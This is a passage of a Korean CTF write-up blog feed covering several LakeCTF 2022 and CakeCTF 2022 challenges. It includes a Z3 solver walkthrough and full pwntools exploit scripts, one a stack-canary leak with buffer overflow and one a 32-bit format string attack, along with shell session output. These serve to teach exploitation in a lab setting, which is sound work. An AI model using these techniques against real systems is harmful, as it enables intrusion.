class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이런식으로 c로 코드를 옮기고 루프를 돌려주면 아래와 같이 <code>98304</code>라는 값이 나온다. 사실 이 문제 정답을 여러개인데 하나만 입력하면 flag를 던져주기 때문에 하나만 출력하고 바로 break를 해주었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ ./solve </span><br><span class="line">98304</span><br><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ nc chall.polygl0ts.ch 3600</span><br><span class="line">What&#x27;s your your number:98304</span><br><span class="line">EPFL&#123;4ft3r_th15_h0w_h4rD_caN_r3V_8e?&#125;</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>이 문제를 파이썬 모듈인 <code>Z3 solver</code>를 이용하여 풀 수도 있다.</p><h3 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h3><p><code>Z3 solver</code>는 특정 값, 즉 정답을 찾아주는 SMT solver 모듈이라고 한다. (SMT: Satisfiability Modulo Theories)<br>어떠한 수식을 만족하는 값이 존재하는 지 찾아주는 건데, 존재한다면 그 값을 구해준다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x + y = 12</span><br><span class="line">x - y = 6</span><br></pre></td></tr></table></figure><p>예를 들어, 이런 연립방정식이 존재할 때, x와 y의 값을 <code>Z3 solver</code>가 구해줄 수 있다.<br>바로 아래와 같이..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from z3 import *</span><br><span class="line">&gt;&gt;&gt; x = Int(&#x27;x&#x27;)</span><br><span class="line">&gt;&gt;&gt; y = Int(&#x27;y&#x27;)</span><br><span class="line">&gt;&gt;&gt; solve(x+y==12,x-y==6)</span><br><span class="line">[x = 9, y = 3]</span><br></pre></td></tr></table></figure><p>아래에 다운로드 방법과 여러 링크들을 남기고 Z3를 이용하여 이 문제를 어떻게 풀 수 있는지 알아보자.</p><h4 id="다운로드-방법"><a href="#다운로드-방법" class="headerlink" title="다운로드 방법"></a><strong>다운로드 방법</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Z3Prover/z3">공식 github 링크</a><br><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">z3py-tutorial</a></p><h3 id="solve-with-Z3"><a href="#solve-with-Z3" class="headerlink" title="solve with Z3"></a>solve with Z3</h3><p>일단. 모듈을 가져오고 변수 두 개를 선언해야 한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ipt = Int(&#x27;ipt&#x27;)</span></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = Int(&#x27;key&#x27;) # key is not variable</span></span><br><span class="line">key = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>실수들이.. 주석처리되어 있는데, 가장 처음 했던 실수는 사용자 인풋을 그냥 <code>Int()</code>로 정의한 점이다.<br><code>BitVec(&quot;&quot;, 비트수)</code>로 정의해야 한다. 왜냐하면 이 문제에서 사용자 인풋을 가지고 비트연산을 진행하는데 <code>Int()</code>로 선언하면 TypeError가 발생하기 때문이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: unsupported operand type(s) for &gt;&gt;: &#x27;instance&#x27; and &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>그래서 비트연산을 할 때는 비트연산을 위한 <code>BitVec()</code>으로 선언을 해줘야 한다.</p><p>두 번째 했던 실수는 단순하다. 그냥 미지수 아닌데 미지수로 선언해줬다. 그러면 안된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br></pre></td></tr></table></figure><p>파이썬으로 연산 코드를 작성해준다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br></pre></td></tr></table></figure><p><code>Z3 solver</code>는 <code>Solver</code> 객체를 지원해준다. 이 객체를 사용해보자. <code>s.add(수식)</code>로 ipt에 대한 제약 조건 및 값을 구하는 조건도 추가해줬다.</p><p><a href="https://z3prover.github.io/api/html/classz3py_1_1_solver.html">Sovler 객체 참고 링크</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># dupule check</span></span><br></pre></td></tr></table></figure><p><code>s.check()</code>는 해당 방적식을 만족하는 값(정답, 해)이 있는지 체크해준다. 값이 있으면 <code>sat</code>, 없으면 <code>unsat</code>, 해결할 수 없으면 <code>unknown</code>을 반환한다고 한다.</p><p>이 문제는 값이 여러 개가 나오므로 중복 체크도 해주었다. 방금 구한 ipt의 값을 제외한 다른 값을 구할 수 있다.</p><p><code>s.model()</code>은 <code>s.check()</code>가 <code>sat</code>일 때 만족하는 해 중 하나를 반환한다.</p><h4 id="최종-코드"><a href="#최종-코드" class="headerlink" title="최종 코드"></a><strong>최종 코드</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># duplicate check</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://tistory.d1n0.me/18">https://tistory.d1n0.me/18</a><br><a href="https://realsung.tistory.com/185">https://realsung.tistory.com/185</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LakeCTF </tag>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Attack on canary (canary)</title>
      <link href="/221003-lakectf2022-attack_on_canary/"/>
      <url>/221003-lakectf2022-attack_on_canary/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>문제 제목에 나와있듯이 바이너리에 Canary가 있고 익스하는 데에 이것과 밀접하게 관련있을 것이다.</p><p>볼만한 함수는 딱 하나 있다. <code>vulnerable()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your command: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tell me which slot you wanna read: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf[<span class="number">8</span> * v1], <span class="number">8uLL</span>); <span class="comment">// 기능 1: canary leak</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me how much you wanna write: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What are the contents (max 8 bytes): &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v1); <span class="comment">// 기능 2: bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능 1) 원하는 주소를 8바이트 읽을 수 있음 -&gt; canary leak<br>기능 2) 원하는 사이즈만큼 쓰기 가능함 -&gt; bof로 인한 rip 변경 가능</p><p>마침 win 함수가 존재하니 이 쪽으로 흐름을 돌리면 될 듯</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>원하는 주소를 읽을 수 있고 원하는 사이즈 만큼 쓰는 건 정말 강력한 것 같다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./exe&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">6100</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = e.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna read: &#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna write: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;)&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] canary :: 0x53eaf0ab9b66a00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: Good</span><br><span class="line">Your command: $ </span><br><span class="line">$ id</span><br><span class="line">/bin/sh: 1: d: not found</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;this_is_clearly_a_fake_flag&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Way to simple (32bit, fsb)</title>
      <link href="/221003-lakectf2022-way_too_simple/"/>
      <url>/221003-lakectf2022-way_too_simple/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure><h3 id="파일-정보"><a href="#파일-정보" class="headerlink" title="파일 정보"></a>파일 정보</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ad8d3e5e9cf076847f4c23ee0443e19aa7170e7c, stripped</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>이 문제는 취약점을 설명하기에 앞서 할 말이 조금 있다.. ㅋㅋ</p><p>문제 실행을 하려는데 아래와 같이 문제 실행이 안되어서 조금 당황했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ ./exe </span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>굳이 실행하려하지말고 도커파일 주어졌는데 build하고 run 하면 되지 않아? 라고 한다면.. 할 말이 없긴 하다. <code>docker build</code>는 성공했으나 <code>docker run</code>이 제대로 되지 않았는데, 이유는 딱히 알아보지 않았다. 왜냐면 그 과정에서 IDA로 바이너리 열었더니 굳이 로컬에서 실행시키지 않아도 풀 수 있을 것 같았기 때문이다. ㅎ</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>일단 문제에서 제공된 바이너리는 32bit 바이너리이다. IDA로 열어보면 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">128</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_1111AE20(off_111B9498, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B9494, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B949C, <span class="number">0</span>);</span><br><span class="line">  flag_addr = (<span class="type">int</span>)read_flag();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is at %p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)flag_addr);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your magical spell! &quot;</span>);</span><br><span class="line">  sub_111187E0(<span class="string">&quot;%127[^\n]&quot;</span>, input);</span><br><span class="line">  <span class="built_in">printf</span>(input);                                <span class="comment">// fsb</span></span><br><span class="line">  sub_111191B0((<span class="type">int</span>)<span class="string">&quot;\nHope you got what you wanted!&quot;</span>);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v5 )</span><br><span class="line">    sub_11137030();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stripped file이라서 함수명이 다 <code>sub_XX</code>로 시작하고 있었다. 그래서 이름을 조금 바꿔줬다.</p><p><code>read_flag()</code> 함수에서 flag를 open해서 read하는데 그 read한 주소를 반환한다.</p><p>결국 flag 위치를 출력해주고, 우리에게 input을 받는다.</p><p>여기서 포인트는 우리 input을 printf로 출력해줄 때 포맷 스트링 없이 출력을 해준다는 것이다. 그러면 <strong>fsb 취약점</strong>이 발생하게 된다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ nc chall.polygl0ts.ch 16000</span><br><span class="line">The flag is at 0x12c1a420</span><br><span class="line">Input your magical spell! AAAA %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">AAAA 0xffad03cc 0xffad0458 0x11111838 0x1118c5cf 0x32323032 0x2a 0x41414141 0x20702520 0x25207025 0x70252070</span><br><span class="line">Hope you got what you wanted!</span><br></pre></td></tr></table></figure><p>offset은 7임을 알 수 있다. </p><p>참고로 32bit 환경에서의 fsb 취약점에 대한 내용은 나의 <a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">구 티스토리 블로그</a>에 자세히 설명되어 있다.</p><p><a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(1)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-2?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(2)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-3?category=899454">32bit에서 FSB (Format String Bug) 이해하기 -(3) (완)</a></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">16000</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;flag address :: &#x27;</span> + <span class="built_in">hex</span>(flag))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += <span class="string">&quot;%7$s&quot;</span>    <span class="comment"># offset is 7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;spell!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] flag address :: 0x12fe0420</span><br><span class="line"> \x04\x127$s</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">  \x04\x12PFL&#123;format_string_are_way_too_old&#125;</span><br><span class="line">Hope you got what you wanted!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>flag가 이런식으로 출력이 되는데, flag 포맷에 맞게 조금 만져주기만 하면 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EPFL&#123;format_string_are_way_too_old&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> 32bit </tag>
            
            <tag> LakeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - str.vs.cstr (cpp)</title>
      <link href="/220928-cakectf2022-str_vs_c.str/"/>
      <url>/220928-cakectf2022-str_vs_c.str/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리, 소스코드(cpp)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="built_in">Test</span>() &#123; std::<span class="built_in">fill</span>(_c_str, _c_str + <span class="number">0x20</span>, <span class="number">0</span>); &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">c_str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _c_str; &#125;</span><br><span class="line">  <span class="function">std::string&amp; <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _str; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  __attribute__((used))</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">call_me</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> _c_str[<span class="number">0x20</span>];</span><br><span class="line">  std::string _str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Test 구조체에 0x20 크기의 <code>_c_str</code>를 정의해놨다.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// set c_str</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;c_str: &quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; test.<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>문제 기능 중에 <code>_c_str</code>에 입력하는 부분이 있는데, 이 때 <strong>입력값 크기를 검증하지 않아 BOF가 발생할 수 있다.</strong></p><p>아쉽게도(?) canary가 존재하여 ROP는 불가능하다.<br>하지만 <code>_c_str</code> 뒤에 <code>std::string</code> 데이터를 가리키는 스택 포인터가 저장되어 있다.</p><p>마침 